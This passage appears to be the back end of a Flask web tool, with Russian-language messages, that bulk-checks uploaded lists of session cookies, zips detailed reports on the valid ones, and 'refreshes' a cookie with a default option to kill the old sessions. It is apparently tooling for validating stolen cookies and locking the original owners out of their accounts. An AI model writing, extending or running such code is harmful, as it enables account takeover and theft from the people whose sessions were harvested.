        a.download = `refreshed_cookies_${new Date().toISOString().slice(0,10)}.txt`;
        a.click();
    }
</script>
</body>
</html>"""

# ============================================================
# API РОУТЫ
# ============================================================

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/fullcheck", methods=["POST"])
def api_fullcheck():
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "Файл не найден"})
    
    content = request.files['file'].read().decode('utf-8', errors='ignore')
    cookies = [line.strip() for line in content.split('\n') if len(line) > 50]
    
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    reports = []
    full_reports = []
    
    for c in cookies:
        info = get_full_info(c)
        if info['status'] == '✅':
            reports.append(format_short_report(info))
            full_reports.append(generate_full_txt_report(info))
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for idx, full_txt in enumerate(full_reports):
            zf.writestr(f"report_{idx+1}.txt", full_txt)
    zip_buffer.seek(0)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"reports_{timestamp}.zip"
    filepath = os.path.join("downloads", filename)
    with open(filepath, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    return jsonify({
        "success": True,
        "total": len(cookies),
        "valid_count": len(reports),
        "reports": reports,
        "download_url": f"/downloads/{filename}"
    })

@app.route("/api/fresh", methods=["POST"])
def api_fresh():
    data = request.json
    cookie = data.get('cookie', '')
    kill_old = data.get('kill_old', True)
    ok, new_cookie, log_text = refresh_cookie_sync(cookie, kill_old)
    return jsonify({"success": ok, "new_cookie": new_cookie, "log": log_text})

@app.route("/downloads/<filename>")
def download_file(filename):
    return send_from_directory("downloads", filename, as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
